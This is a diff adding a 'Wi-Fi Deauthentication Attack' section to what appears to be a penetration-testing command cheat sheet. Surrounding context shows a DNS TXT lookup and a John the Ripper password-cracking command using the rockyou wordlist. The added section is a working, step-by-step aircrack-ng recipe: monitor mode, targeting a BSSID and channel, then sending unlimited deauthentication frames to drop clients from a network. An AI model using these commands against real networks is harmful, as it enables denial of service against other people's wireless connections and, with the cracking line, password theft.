@@ -375,6 +375,24 @@ $ dig +short TXT domain.com
 # john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
+**Wi-Fi Deauthentication Attack**
+```
+#1
+airmon-ng start [wi-fi interface]
+
+#2
+airodump-ng -d [BSSID] -c [chanel] [wi-fi interface_mon]
+
+#3
+aireplay-ng -0 0 -a [BSSID] [wi-fi interface_mon]
+
+#Example:
+# airmon-ng start wlp2s0
+# airodump-ng -d AA:BB:CC:DD:EE:FF -c 6 wlp2s0mon
+# aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlp2s0mon
+```
+
+
 ```
 @dnat
 ```
